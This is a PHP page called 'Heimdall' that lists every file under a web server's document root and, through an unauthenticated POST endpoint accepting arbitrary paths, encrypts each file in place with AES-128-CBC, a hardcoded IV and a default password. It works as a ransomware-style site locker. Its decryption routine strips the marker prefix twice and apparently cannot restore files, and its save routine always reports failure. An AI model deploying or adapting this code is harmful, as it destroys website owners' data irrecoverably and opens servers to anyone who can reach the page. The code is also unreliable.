<?php

/**
 * Created by PhpStorm.
 * User: lenon
 * Date: 12/10/16
 * Time: 14:30
 */
//echo "<pre>";
//var_dump($_SERVER);
if(isset($_POST['action'])){

    $heimdall= new Heimdall();
    $heimdall->setPassword($_POST['password']);
    switch ($_POST['action']) {
        case 'criptography':
            $heimdall->criptographyByUrl($_POST['path']);
            exit();
            break;
        case 'descriptography':
            $heimdall->descriptographyByUrl($_POST['path']);
            break;
        case 2:
            echo "i equals 2";
            break;

    }
    exit();
}

?>

<html>
<head>
    <link rel="stylesheet" href="//code.jquery.com/ui/1.12.0/themes/base/jquery-ui.css">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.10.12/css/jquery.dataTables.min.css">
    <script type="application/javascript" src="//code.jquery.com/jquery-1.12.3.js"></script>
    <script type="application/javascript" src="https://cdn.datatables.net/1.10.12/js/jquery.dataTables.min.js"></script>
    <script type="application/javascript" src="https://code.jquery.com/ui/1.12.0/jquery-ui.js"></script>
    <script>

        $(document).ready(function() {
            $('#table1').DataTable();
            $('#sendPass').click(function (){
                i=1;
                $('#table > tbody  > tr').each(function() {
                    var $this = this;
                    setTimeout(function() {
                        path=$($this).find('td:nth-child(2)').html().trim();
                        $.ajax({
                            type: "post",
                            data: {action:'criptography', path: path,password:$('#password').val()},
                            success:function(data) {
                                $($this).find('td:last-child').html('<span class=\'encrypted\'>encrypted</span>');
                            }
                        });
                    }, 300*i);
                    i++;
                    //console.log($(this).find('td:first-child').html());

                });
//                $.get("?pathfile="+$(this).attr('data-path'), function(data) {
//                    $('#myModal').html(data);
//                });
            });
            $('#sendDePass').click(function (){
                i=1;
                $('#table > tbody  > tr').each(function() {
                    var $this = this;
                    setTimeout(function() {
                        path=$($this).find('td:nth-child(2)').html().trim();
                        $.ajax({
                            type: "post",
                            data: {action:'descriptography', path: path,password:$('#password').val()},
                            success:function(data) {
                                $($this).find('td:last-child').html('<span class=\'decrypted\'>decrypted</span>');
                            }
                        });
                    }, 300*i);
                    i++;
                });
            });


        });

    </script>
    <style>
        .encrypted{
            color:red;
        }
        .decrypted{
            color:blue;
        }
    </style>
</head>

<body>
<?php

    ini_set('display_errors',1);
    ini_set('display_startup_erros',1);
    error_reporting(E_ALL);


    $heimdall = new Heimdall();
//    $file = $heimdall->readFile('/home/lenon/Workspace/wordpress/thema/circles_wp_3.5/Circles/attachment.php');
//    $fileCriptgrafy= $heimdall->cryptography($file);
//    $fileDesCriptgrafy= $heimdall->descryptography($fileCriptgrafy);
    ?>
    <fieldset>
        <legend>
            Heimdall Encrypted
        </legend>
        <form id="formCriptography">
            <label>Password for encrypted</label>
            <input type="text" name="password" id="password">
            <input type="button" value="Send" id="sendPass">
        </form>
    </fieldset>
    <fieldset>
        <legend>
            Heimdall Decrypted
        </legend>
        <form id="formDecriptography">
            <label>Password for decrypted</label>
            <input type="text" name="password" id="password">
            <input type="button" value="Send" id="sendDePass">
        </form>
    </fieldset>
    <?php
    //list of files
    $arrList=$heimdall->getDirContents($_SERVER['DOCUMENT_ROOT']);
    echo "Total of ".count($arrList)." files<br>";
    ?>
    <table id="table" class="display" cellspacing="0" width="100%">
        <thead>
            <tr>
                <th>
                    Number
                </th>
                <th>
                    Path/File
                </th>
                <th>
                    Status
                </th>
            </tr>
        </thead>
        <tbody>
        <?php
            foreach($arrList as $key=>$file){
                ?>

                <tr>

                    <td>
                        <?php   echo $key;?>
                    </td>
                    <td>
                        <?php   echo $file;?>
                    </td>
                    <td>
                        <?php
                            if($heimdall->checkIfIsCriptograpfy($file)){
                                echo "<span class='encrypted'>encrypted</span>";
                            }else{
                                echo "<span class='decrypted'>decrypted</span>";
                            };

                        ?>
                    </td>
                </tr>
        <?php
            }
        ?>
        </tbody>
    </table>
</body>
</html>
<?php




//class Heimdall
class Heimdall{

    public $algorithm;
    public $password;
    public $IV;

    public function __construct()
    {
        $this->algorithm='AES-128-CBC';
        $this->IV='Gj4LL4rH0rn0nL33';
        $this->password='HeimdallF0r4ll';
    }

    public function setPassword($password)
    {
        $this->password = $password;
    }

    public function cryptography($text){
        return "Heimdall---".openssl_encrypt($text, $this->algorithm, $this->password, 0, $this->IV);
    }

    public function descryptography($hash){
        $arrHash=explode("Heimdall---",$hash);
        return openssl_decrypt($arrHash[1], $this->algorithm, $this->password, 0, $this->IV);
    }

    public function getDirContents($dir, &$results = array()){
        $files = scandir($dir);

        foreach($files as $key => $value){
            $path = realpath($dir.DIRECTORY_SEPARATOR.$value);
            //Check size of files, read only < 9 mb
            if(filesize($path)<=10000000){
                if(!is_dir($path)) {
                    $results[] = $path;
                } else if($value != "." && $value != "..") {
                    self::getDirContents($path, $results);
                    $results[] = $path;
                }
            }

        }

        return $results;
    }

    public function readFile($url){
        return file_get_contents($url);
//        $myfile = fopen($url, "r") or die("Unable to open file!");
//        $file= fread($myfile,filesize($url));
//        fclose($myfile);
//        return $file;
    }

    public function criptographyByUrl($url){
        $file = $this->readFile($url);
        $fileCriptgrafy= $this->cryptography($file);
        $arrSignature=explode("Heimdall---",$fileCriptgrafy);
        if(isset($arrSignature[1])){
            if($this->editFile($url,$fileCriptgrafy)){
                echo "ok";
            }else{
                echo "fail";
            }

        }else{
            echo "fail";
        }
    }

    public function descriptographyByUrl($url){
        $file = $this->readFile($url);
        $arrSignature=explode("Heimdall---",$file);
        if(isset($arrSignature[1])){
            $fileDesCriptgrafy= $this->descryptography($arrSignature[1]);
            if($this->editFile($url,$fileDesCriptgrafy)){
                echo "ok";
            }else{
                echo "fail";
            }
        }else{
            echo "fail";
        }
    }

    private function editFile($url,$content){
        try{
            file_put_contents($url,$content);
        }catch(Exception $e){
            var_dump($e);
        }

    }

    public function checkIfIsCriptograpfy($url){
        $file = $this->readFile($url);
        $arrSignature=explode("Heimdall---",$file);
        if(isset($arrSignature[1])){
            return true;
        }
        return false;
    }
}


